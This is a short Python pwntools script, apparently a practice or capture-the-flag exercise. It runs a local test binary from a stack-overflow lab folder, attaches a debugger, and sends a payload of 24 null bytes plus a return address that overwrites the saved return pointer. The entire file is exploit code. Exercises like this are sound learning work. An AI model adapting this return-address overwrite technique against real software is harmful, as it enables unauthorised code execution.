from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/64bit/stack_overflow/dynamic/test1/dynamic_test1")
pwn.gdb.attach(p)
payload = b"\x00" * 24
payload += p64(0x400698)
payload = payload.ljust(256, b"a")
p.send(payload)
p.interactive()
